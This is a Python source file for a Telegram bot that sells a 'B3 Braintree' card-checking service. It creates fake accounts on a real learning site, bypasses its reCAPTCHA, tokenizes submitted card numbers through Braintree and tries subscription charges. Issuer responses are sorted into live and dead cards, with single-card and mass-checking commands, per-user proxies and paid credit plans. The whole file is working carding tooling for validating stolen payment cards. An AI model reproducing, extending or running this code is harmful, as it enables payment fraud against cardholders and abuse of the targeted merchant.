import re
import json
import requests
import asyncio
import base64
from time import time
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.enums import ChatType
from BOT.tools.proxy import get_proxy
from faker import Faker
from fake_useragent import UserAgent

user_locks = {}

# B3 (Braintree) Gate Class
class B3Gate:
    """Braintree Pixorize Gate"""
    
    def __init__(self, proxy=None):
        self.s = requests.Session()
        self.proxy = proxy
        self.fake = Faker('en_US')
        
        try:
            ua = UserAgent()
            self.user_agent = ua.random
        except:
            self.user_agent = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
        
        if proxy:
            self.s.proxies = {'http': proxy, 'https': proxy}
    
    def recaptcha_bypass(self):
        """Bypass reCAPTCHA for Pixorize"""
        try:
            anchor_url = "https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LdSSo8pAAAAAN30jd519vZuNrcsbd8jvCBvkxSD&co=aHR0cHM6Ly9waXhvcml6ZS5jb206NDQz&hl=en&v=_mscDd1KHr60EWWbt2I_ULP0&size=invisible&anchor-ms=20000&execute-ms=15000&cb=9rxqj565e126"
            reload_url = "https://www.google.com/recaptcha/enterprise/reload?k=6LdSSo8pAAAAAN30jd519vZuNrcsbd8jvCBvkxSD"
            
            from urllib.parse import urlparse, parse_qs
            
            headers = {
                "User-Agent": self.user_agent
            }
            
            parsed_url = urlparse(anchor_url)
            params = parse_qs(parsed_url.query)
            
            response = self.s.get(anchor_url, headers=headers, timeout=30)
            token_match = re.search(r'value="([^"]+)"', response.text)
            if not token_match:
                return None
            token = token_match.group(1)
            
            data = {
                'v': params['v'][0],
                'reason': 'q',
                'c': token,
                'k': params['k'][0],
                'co': params['co'][0],
                'hl': 'tr',
                'size': 'invisible'
            }
            
            headers.update({
                "Referer": response.url,
                "Content-Type": "application/x-www-form-urlencoded"
            })
            
            response = self.s.post(reload_url, headers=headers, data=data, timeout=30)
            captcha_match = re.search(r'\["rresp","([^"]+)"', response.text)
            if captcha_match:
                return captcha_match.group(1)
            return None
        except Exception as e:
            return None
    
    def check_card(self, cc, mm, yy, cvv):
        """Full Braintree check via Pixorize"""
        try:
            import random
            import string
            
            # Generate random email
            j = "1234567890qawsedzrtzfgxyuchjbiokblpn"
            em = ''.join(random.choice(j) for _ in range(8))
            email = em + "@gmail.com"
            
            # Format year
            if len(yy) == 4:
                yy = yy[2:4]
            
            # Step 1: Register user
            url = "https://apitwo.pixorize.com/users/register-simple"
            
            payload = {
                "email": email,
                "password": "jdjrj@#818",
                "learner_classification": 1
            }
            
            headers = {
                'User-Agent': self.user_agent,
                'Content-Type': "application/json",
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-platform': '"Android"',
                'sec-ch-ua-mobile': '?1',
                'Origin': "https://pixorize.com",
                'Sec-Fetch-Site': "same-site",
                'Sec-Fetch-Mode': "cors",
                'Sec-Fetch-Dest': "empty",
                'Referer': "https://pixorize.com/",
                'Accept-Language': "en-US,en;q=0.9,ar;q=0.8",
            }
            
            response = self.s.post(url, json=payload, headers=headers, timeout=30)
            
            if response.status_code != 200 and response.status_code != 201:
                return "Declined ❌", "Registration Failed"
            
            # Step 2: Get Braintree token
            url = "https://apitwo.pixorize.com/braintree/token"
            
            headers = {
                'User-Agent': self.user_agent,
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'Origin': "https://pixorize.com",
                'Sec-Fetch-Site': "same-site",
                'Sec-Fetch-Mode': "cors",
                'Sec-Fetch-Dest': "empty",
                'Referer': "https://pixorize.com/",
                'Accept-Language': "en-US,en;q=0.9,ar;q=0.8",
            }
            
            response = self.s.get(url, headers=headers, cookies=self.s.cookies, timeout=30)
            
            try:
                au = response.json()['payload']['clientToken']
                base4 = str(base64.b64decode(au))
                auth = base4.split('"authorizationFingerprint":')[1].split('"')[1]
            except:
                return "Declined ❌", "Token Error"
            
            # Step 3: Tokenize card
            url = "https://payments.braintree-api.com/graphql"
            
            payload = {
                "clientSdkMetadata": {
                    "source": "client",
                    "integration": "dropin2",
                    "sessionId": "90ec9e6b-9389-45c9-9542-ba6271ad49c6"
                },
                "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
                "variables": {
                    "input": {
                        "creditCard": {
                            "number": cc,
                            "expirationMonth": mm,
                            "expirationYear": "20" + yy,
                            "cvv": cvv,
                            "billingAddress": {
                                "postalCode": "10090"
                            }
                        },
                        "options": {
                            "validate": False
                        }
                    }
                },
                "operationName": "TokenizeCreditCard"
            }
            
            headers = {
                'User-Agent': self.user_agent,
                'Content-Type': "application/json",
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'authorization': "Bearer " + auth,
                'braintree-version': "2018-05-10",
                'sec-ch-ua-platform': '"Android"',
                'origin': "https://assets.braintreegateway.com",
                'sec-fetch-site': "cross-site",
                'sec-fetch-mode': "cors",
                'sec-fetch-dest': "empty",
                'referer': "https://assets.braintreegateway.com/",
                'accept-language': "en-US,en;q=0.9,ar;q=0.8"
            }
            
            response = self.s.post(url, json=payload, headers=headers, timeout=30)
            
            try:
                token = response.json()["data"]["tokenizeCreditCard"]["token"]
            except:
                # Check for errors
                try:
                    errors = response.json().get("errors", [])
                    if errors:
                        error_msg = errors[0].get("message", "Token Error")
                        return "Declined ❌", error_msg[:40]
                except:
                    pass
                return "Declined ❌", "Tokenize Error"
            
            # Step 4: Get captcha
            captcha_token = self.recaptcha_bypass()
            if not captcha_token:
                return "Declined ❌", "Captcha Error"
            
            # Step 5: Process payment
            url = "https://apitwo.pixorize.com/braintree/pay"
            
            payload = {
                "subscriptionTypeId": 26,
                "nonce": token,
                "deviceData": '{"device_session_id":"1828806e70140be76f80b47aa269ef20","fraud_merchant_id":null,"correlation_id":"8adec9342087be4c33374c6ab459cb56"}',
                "promoCode": None,
                "captchaToken": captcha_token
            }
            
            headers = {
                'User-Agent': self.user_agent,
                'Content-Type': "application/json",
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-platform': '"Android"',
                'sec-ch-ua-mobile': '?1',
                'Origin': "https://pixorize.com",
                'Sec-Fetch-Site': "same-site",
                'Sec-Fetch-Mode': "cors",
                'Sec-Fetch-Dest': "empty",
                'Referer': "https://pixorize.com/",
                'Accept-Language': "en-US,en;q=0.9,ar;q=0.8",
            }
            
            response = self.s.post(url, json=payload, headers=headers, cookies=self.s.cookies, timeout=30)
            response_text = response.text
            
            # Parse Braintree/Pixorize specific responses
            # CVV Declined = Live (card is valid)
            if "Card Issuer Declined CVV" in response_text:
                return "Approved ✅", "CVV Declined"
            
            elif "Reason: CVV" in response_text:
                return "Approved ✅", "CVV Error"
            
            # Insufficient Funds = Live
            elif "Insufficient Funds" in response_text:
                return "Approved ✅", "Insufficient Funds"
            
            # Success/Charged
            elif 'success' in response_text.lower() or 'charged' in response_text.lower():
                return "Charged 💎", "Payment Success"
            
            # Declined responses
            elif "Call Issuer" in response_text and "Pick Up Card" in response_text:
                return "Declined ❌", "Call Issuer - Pick Up Card"
            
            elif "Call Issuer" in response_text:
                return "Declined ❌", "Call Issuer"
            
            elif "Transaction Not Allowed" in response_text:
                return "Declined ❌", "Transaction Not Allowed"
            
            elif "Card Not Activated" in response_text:
                return "Declined ❌", "Card Not Activated"
            
            elif "Closed Card" in response_text:
                return "Declined ❌", "Closed Card"
            
            elif "Do Not Honor" in response_text:
                return "Declined ❌", "Do Not Honor"
            
            elif "No Account" in response_text:
                return "Declined ❌", "No Account"
            
            elif "Expired Card" in response_text:
                return "Declined ❌", "Expired Card"
            
            elif "Cannot Authorize" in response_text and "Policy" in response_text:
                return "Declined ❌", "Cannot Authorize (Policy)"
            
            elif "Cannot Authorize" in response_text and "Life cycle" in response_text:
                return "Declined ❌", "Cannot Authorize (Lifecycle)"
            
            elif "No Such Issuer" in response_text:
                return "Declined ❌", "No Such Issuer"
            
            elif "Fraud Suspected" in response_text:
                return "Declined ❌", "Fraud Suspected"
            
            elif "Processor Declined" in response_text:
                return "Declined ❌", "Processor Declined"
            
            elif "restriction on the card" in response_text:
                return "Declined ❌", "Card Restricted"
            
            elif "Credit card number is invalid" in response_text:
                return "Declined ❌", "Invalid Card Number"
            
            # Generic error parsing
            try:
                resp_json = response.json()
                message = resp_json.get("message", "")
                error = resp_json.get("error", "")
                
                msg_upper = (str(message) + str(error)).upper()
                
                # CVV/CVC errors = Approved (CCN)
                if "CVV" in msg_upper or "CVC" in msg_upper or "SECURITY" in msg_upper:
                    return "Approved ✅", message[:40] if message else "CVV Error"
                
                # Insufficient funds = Approved
                elif "INSUFFICIENT" in msg_upper:
                    return "Approved ✅", "Insufficient Funds"
                
                # Declined
                elif "DECLINED" in msg_upper or "DENIED" in msg_upper:
                    return "Declined ❌", message[:40] if message else "Card Declined"
                
                # Invalid card
                elif "INVALID" in msg_upper or "INCORRECT" in msg_upper:
                    return "Declined ❌", message[:40] if message else "Invalid Card"
                
                # Expired
                elif "EXPIRED" in msg_upper:
                    return "Declined ❌", "Expired Card"
                
                else:
                    return "Declined ❌", message[:40] if message else "Unknown Error"
                    
            except:
                pass
            
            return "Declined ❌", "Unknown Response"
            
        except requests.exceptions.Timeout:
            return "Declined ❌", "Timeout"
        except requests.exceptions.ProxyError:
            return "Declined ❌", "Proxy Error"
        except requests.exceptions.ConnectionError:
            return "Declined ❌", "Connection Error"
        except Exception as e:
            return "Declined ❌", str(e)[:40]


def load_users():
    try:
        with open("DATA/users.json", "r") as f:
            return json.load(f)
    except:
        return {}

def load_allowed_groups():
    try:
        with open("DATA/groups.json", "r") as f:
            return json.load(f)
    except:
        return []

def has_credits(user_id):
    try:
        with open("DATA/users.json", "r") as f:
            users = json.load(f)
        user = users.get(str(user_id))
        if not user:
            return False
        credits = user.get("plan", {}).get("credits", 0)
        if credits == "∞":
            return True
        return int(credits) > 0
    except:
        return False

def deduct_credit(user_id):
    try:
        with open("DATA/users.json", "r") as f:
            users = json.load(f)
        user = users.get(str(user_id))
        if not user:
            return False
        credits = user["plan"].get("credits", 0)
        if credits == "∞":
            return True
        if int(credits) > 0:
            user["plan"]["credits"] = str(int(credits) - 1)
            users[str(user_id)] = user
            with open("DATA/users.json", "w") as f:
                json.dump(users, f, indent=4)
            return True
        return False
    except:
        return False

def deduct_credit_bulk(user_id, amount):
    try:
        with open("DATA/users.json", "r") as f:
            users = json.load(f)
        user = users.get(str(user_id))
        if not user:
            return False
        credits = user["plan"].get("credits", 0)
        if credits == "∞":
            return True
        credits = int(credits)
        if credits >= amount:
            user["plan"]["credits"] = str(credits - amount)
            users[str(user_id)] = user
            with open("DATA/users.json", "w") as f:
                json.dump(users, f, indent=4)
            return True
        return False
    except:
        return False

def extract_card(text):
    match = re.search(r'(\d{12,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})', text)
    if match:
        return match.groups()
    return None

def extract_cards(text):
    return re.findall(r'(\d{12,19}\|\d{1,2}\|\d{2,4}\|\d{3,4})', text)

def check_b3(cc, mm, yy, cvv, proxy=None):
    """B3 check function"""
    gate = B3Gate(proxy=proxy)
    return gate.check_card(cc, mm, yy, cvv)

def is_premium_user(user_id):
    """Check if user is premium (not Free or Redeem Code)"""
    try:
        users = load_users()
        user = users.get(str(user_id))
        if not user:
            return False
        plan = user.get("plan", {}).get("plan", "Free")
        return plan not in ["Free", "Redeem Code"]
    except:
        return False

def is_free_user(user_id):
    try:
        users = load_users()
        user = users.get(str(user_id))
        if not user:
            return True
        plan = user.get("plan", {}).get("plan", "Free")
        return plan in ["Free", "Redeem Code"]
    except:
        return True

def get_owner_link():
    """Get owner link from config"""
    try:
        with open("FILES/config.json", "r") as f:
            config = json.load(f)
        owner_id = config.get("OWNER", "")
        return f"https://t.me/gitsus"
    except:
        return "https://t.me/gitsus"


@Client.on_message(filters.command("b3") & ~filters.edited)
async def b3_single(client, message):
    """Single card B3 checker - Premium Only"""
    try:
        allowed_groups = load_allowed_groups()
        user_id = str(message.from_user.id)
        
        # Premium only check
        if not is_premium_user(user_id):
            return await message.reply(
                "<pre>Notification ❗️</pre>\n"
                "<b>~ Message :</b> <code>Only For Premium Users !</code>\n"
                '<b>~ Buy Premium →</b> <b><a href="https://t.me/gitsus">Click Here</a></b>\n'
                "━━━━━━━━━━━━━\n"
                "<b>Type <code>/buy</code> to get Premium.</b>",
                reply_to_message_id=message.id
            )
        
        if message.chat.type == ChatType.PRIVATE:
            if is_free_user(user_id):
                return await message.reply(
                    "<pre>Notification ❗️</pre>\n"
                    "<b>~ Message :</b> <code>Free users can only check in groups!</code>\n"
                    "<b>~ Get Premium to use in private</b>\n"
                    "━━━━━━━━━━━━━\n"
                    "<b>Type <code>/buy</code> to get Premium.</b>",
                    reply_to_message_id=message.id
                )
        elif message.chat.type in [ChatType.GROUP, ChatType.SUPERGROUP]:
            if message.chat.id not in allowed_groups:
                return await message.reply(
                    "<pre>Notification ❗️</pre>\n"
                    "<b>~ Message :</b> <code>This Group Is Not Approved ⚠️</code>",
                )
        
        users = load_users()
        
        if user_id not in users:
            return await message.reply(
                "<pre>Access Denied 🚫</pre>\n<b>Register first using</b> <code>/register</code>",
                reply_to_message_id=message.id
            )
        
        if not has_credits(user_id):
            return await message.reply(
                "<pre>Insufficient Credits ❗️</pre>\n<b>Type /buy to get Credits.</b>",
                reply_to_message_id=message.id
            )
        
        target_text = None
        if message.reply_to_message and message.reply_to_message.text:
            target_text = message.reply_to_message.text
        elif len(message.text.split(maxsplit=1)) > 1:
            target_text = message.text.split(maxsplit=1)[1]
        
        if not target_text:
            return await message.reply(
                "<pre>CC Not Found ❌</pre>\n<b>Usage:</b> <code>/b3 cc|mm|yy|cvv</code>",
                reply_to_message_id=message.id
            )
        
        extracted = extract_card(target_text)
        if not extracted:
            return await message.reply(
                "<pre>Invalid Format ❌</pre>\n<b>Usage:</b> <code>/b3 cc|mm|yy|cvv</code>",
                reply_to_message_id=message.id
            )
        
        cc, mm, yy, cvv = extracted
        fullcc = f"{cc}|{mm}|{yy}|{cvv}"
        
        proxy = get_proxy(message.from_user.id)
        
        start_time = time()
        
        loading_msg = await message.reply(
            f"<pre>✦ [$b3] | Processing..!</pre>\n━━━━━━━━━━━━\n[•] Card- <code>{fullcc}</code>\n[•] Gate - <code>B3 Braintree</code>",
            reply_to_message_id=message.id
        )
        
        loop = asyncio.get_event_loop()
        status, response = await loop.run_in_executor(None, check_b3, cc, mm, yy, cvv, proxy)
        
        end_time = time()
        timetaken = round(end_time - start_time, 2)
        
        user_data = users.get(user_id, {})
        plan = user_data.get("plan", {}).get("plan", "Free")
        badge = user_data.get("plan", {}).get("badge", "🎟️")
        
        # Clickable username
        profile = f"<a href='tg://user?id={user_id}'>{message.from_user.first_name}</a>"
        
        final_msg = f"""<b>[#B3] | Sos</b> ✦
━━━━━━━━━━━━━━━
<b>[•] Card-</b> <code>{fullcc}</code>
<b>[•] Gateway -</b> <code>B3 Braintree</code>
<b>[•] Status-</b> <code>{status}</code>
<b>[•] Response-</b> <code>{response}</code>
━━━━━━━━━━━━━━━
<b>[ﾒ] Checked By:</b> {profile} [<code>{plan} {badge}</code>]
<b>[ﾒ] T/t:</b> <code>[{timetaken} 𝐬]</code>"""
        
        buttons = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("Support", url="https://t.me/gitsus"),
                InlineKeyboardButton("Owner", url=get_owner_link())
            ]
        ])
        
        await loading_msg.edit(final_msg, reply_markup=buttons, disable_web_page_preview=True)
        
        deduct_credit(user_id)
    
    except Exception as e:
        await message.reply(f"<code>Error: {str(e)[:50]}</code>", reply_to_message_id=message.id)


@Client.on_message(filters.command("mb3") & ~filters.edited)
async def b3_mass(client, message):
    """Mass B3 checker - Premium Only"""
    user_id = str(message.from_user.id)
    
    if not message.from_user:
        return await message.reply("❌ Cannot process this message.")
    
    # Premium only check
    if not is_premium_user(user_id):
        return await message.reply(
            "<pre>Notification ❗️</pre>\n"
            "<b>~ Message :</b> <code>Only For Premium Users !</code>\n"
            '<b>~ Buy Premium →</b> <b><a href="https://t.me/gitsus">Click Here</a></b>\n'
            "━━━━━━━━━━━━━\n"
            "<b>Type <code>/buy</code> to get Premium.</b>",
            reply_to_message_id=message.id
        )
    
    if user_id in user_locks:
        return await message.reply(
            "<pre>⚠️ Wait!</pre>\n<b>Your previous /mb3 is still processing.</b>",
            reply_to_message_id=message.id
        )
    
    user_locks[user_id] = True
    
    try:
        users = load_users()
        allowed_groups = load_allowed_groups()
        
        if message.chat.type == ChatType.PRIVATE:
            if is_free_user(user_id):
                user_locks.pop(user_id, None)
                return await message.reply(
                    "<pre>Notification ❗️</pre>\n"
                    "<b>~ Message :</b> <code>Free users can only check in groups!</code>\n"
                    "<b>~ Get Premium to use in private</b>\n"
                    "━━━━━━━━━━━━━\n"
                    "<b>Type <code>/buy</code> to get Premium.</b>",
                    reply_to_message_id=message.id
                )
        elif message.chat.type in [ChatType.GROUP, ChatType.SUPERGROUP]:
            if message.chat.id not in allowed_groups:
                user_locks.pop(user_id, None)
                return await message.reply(
                    "<pre>Notification ❗️</pre>\n<b>This Group Is Not Approved ⚠️</b>",
                    reply_to_message_id=message.id
                )
        
        if user_id not in users:
            user_locks.pop(user_id, None)
            return await message.reply(
                "<pre>Access Denied 🚫</pre>\n<b>Register first using</b> <code>/register</code>",
                reply_to_message_id=message.id
            )
        
        user_data = users[user_id]
        plan_info = user_data.get("plan", {})
        plan_name = plan_info.get("plan", "Free")
        
        # Card limits based on plan - Ultimate: 100, VIP: 50, default: mlimit
        if plan_name.upper() == "ULTIMATE":
            mlimit = 100
        elif plan_name.upper() == "VIP":
            mlimit = 50
        else:
            mlimit = plan_info.get("mlimit", 10)
        
        badge = plan_info.get("badge", "🎟️")
        
        if mlimit is None or str(mlimit).lower() in ["null", "none"]:
            mlimit = 10000
        else:
            mlimit = int(mlimit)
        
        target_text = None
        if message.reply_to_message and message.reply_to_message.text:
            target_text = message.reply_to_message.text
        elif len(message.text.split(maxsplit=1)) > 1:
            target_text = message.text.split(maxsplit=1)[1]
        
        if not target_text:
            user_locks.pop(user_id, None)
            return await message.reply(
                "❌ Send cards!\nFormat: <code>4111111111111111|12|25|123</code>",
                reply_to_message_id=message.id
            )
        
        all_cards = extract_cards(target_text)
        if not all_cards:
            user_locks.pop(user_id, None)
            return await message.reply("❌ No valid cards found!", reply_to_message_id=message.id)
        
        if len(all_cards) > mlimit:
            all_cards = all_cards[:mlimit]
        
        available_credits = user_data.get("plan", {}).get("credits", 0)
        card_count = len(all_cards)
        
        if available_credits != "∞":
            try:
                if card_count > int(available_credits):
                    user_locks.pop(user_id, None)
                    return await message.reply(
                        "<pre>Insufficient Credits ❗️</pre>\n<b>Type /buy to get Credits.</b>",
                        reply_to_message_id=message.id
                    )
            except:
                pass
        
        # Clickable username
        checked_by = f"<a href='tg://user?id={user_id}'>{message.from_user.first_name}</a> [<code>{plan_name} {badge}</code>]"
        
        proxy = get_proxy(message.from_user.id)
        
        loader_msg = await message.reply(
            f"<pre>✦ [$mb3] | M-B3</pre>\n"
            f"<b>[⚬] Gateway:</b> <b>B3 Braintree</b>\n"
            f"<b>[⚬] Cards:</b> <code>{card_count}</code>\n"
            f"<b>[⚬] Status:</b> <code>Processing...</code>",
            reply_to_message_id=message.id
        )
        
        start_time = time()
        final_results = []
        loop = asyncio.get_event_loop()
        
        for card in all_cards:
            parts = card.split("|")
            if len(parts) == 4:
                cc, mm, yy, cvv = parts
                status, response = await loop.run_in_executor(None, check_b3, cc, mm, yy, cvv, proxy)
                
                final_results.append(
                    f"[•] <b>Card:</b> <code>{card}</code>\n"
                    f"[•] <b>Status:</b> <code>{status}</code>\n"
                    f"[•] <b>Response:</b> <code>{response}</code>\n"
                    "━━━━━━━━━━━━"
                )
                
                # Show ALL results, not just last 8
                try:
                    # Calculate how many results to show in progress update
                    # Show all but cap message length
                    display_results = final_results if len(final_results) <= 20 else final_results[-20:]
                    
                    await loader_msg.edit(
                        f"<pre>✦ [$mb3] | M-B3</pre>\n"
                        + "\n".join(display_results) + "\n"
                        f"<b>[⚬] Progress:</b> <code>{len(final_results)}/{card_count}</code>\n"
                        f"<b>[ﾒ] Checked By:</b> {checked_by}",
                        disable_web_page_preview=True
                    )
                except:
                    pass
        
        end_time = time()
        timetaken = round(end_time - start_time, 2)
        
        if available_credits != "∞":
            deduct_credit_bulk(user_id, card_count)
        
        # Final message - show ALL results
        final_text = f"<pre>✦ [$mb3] | M-B3</pre>\n"
        final_text += "\n".join(final_results) + "\n"
        final_text += f"<b>[ﾒ] T/t:</b> <code>[{timetaken} 𝐬]</code>\n"
        final_text += f"<b>[ﾒ] Total:</b> <code>{card_count} cards</code>\n"
        final_text += f"<b>[ﾒ] Checked By:</b> {checked_by}"
        
        # If message too long, send as file
        if len(final_text) > 4000:
            import os
            os.makedirs("downloads", exist_ok=True)
            filename = f"downloads/mb3_results_{user_id}.txt"
            
            with open(filename, "w") as f:
                f.write("Mass B3 Braintree Results\n")
                f.write("=" * 50 + "\n\n")
                for result in final_results:
                    clean_result = result.replace("<b>", "").replace("</b>", "").replace("<code>", "").replace("</code>", "")
                    f.write(clean_result + "\n")
                f.write("\n" + "=" * 50 + "\n")
                f.write(f"Time taken: {timetaken}s\n")
                f.write(f"Total cards: {card_count}\n")
            
            buttons = InlineKeyboardMarkup([
                [
                    InlineKeyboardButton("Support", url="https://t.me/gitsus"),
                    InlineKeyboardButton("Owner", url=get_owner_link())
                ]
            ])
            
            await message.reply_document(
                filename,
                caption=f"<pre>✦ [$mb3] | M-B3 Results</pre>\n"
                        f"<b>[ﾒ] Total:</b> <code>{card_count} cards</code>\n"
                        f"<b>[ﾒ] T/t:</b> <code>[{timetaken} 𝐬]</code>\n"
                        f"<b>[ﾒ] Checked By:</b> {checked_by}",
                reply_to_message_id=message.id,
                reply_markup=buttons
            )
            await loader_msg.delete()
            os.remove(filename)
        else:
            buttons = InlineKeyboardMarkup([
                [
                    InlineKeyboardButton("Support", url="https://t.me/gitsus"),
                    InlineKeyboardButton("Owner", url=get_owner_link())
                ]
            ])
            
            await loader_msg.edit(
                final_text,
                disable_web_page_preview=True,
                reply_markup=buttons
            )
    
    except Exception as e:
        await message.reply(f"⚠️ Error: {str(e)[:50]}", reply_to_message_id=message.id)
    
    finally:
        user_locks.pop(user_id, None)
